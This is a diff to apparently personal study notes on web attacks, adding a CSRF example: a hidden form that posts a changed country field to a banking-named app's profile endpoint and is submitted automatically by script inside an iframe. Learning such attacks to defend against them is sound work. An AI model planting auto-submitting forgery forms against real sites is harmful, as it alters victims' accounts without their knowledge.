@@ -22,6 +22,17 @@ Cross-site request forgery attacks (CSRF)
 
 Example of CSRF attack (session riding): https://jsfiddle.net/dg1t0sa4/15/
 
+Create a link that goes to some html and in the background this happens in iframe:
+
+```
+<form id="account_update_form" method='POST' action='https://453f620f9ff35bb3-dot-mehbanking.appspot.com/profile'>
+<input name="address_country" value="hey another country!!!">
+<input type='submit' value='Save Info to Profile'>
+</form>
+
+<script>document.getElementById("account_update_form").submit()</script>
+```
+
 SQL injection (SQLi)
 
 - SQL is inserted into forms
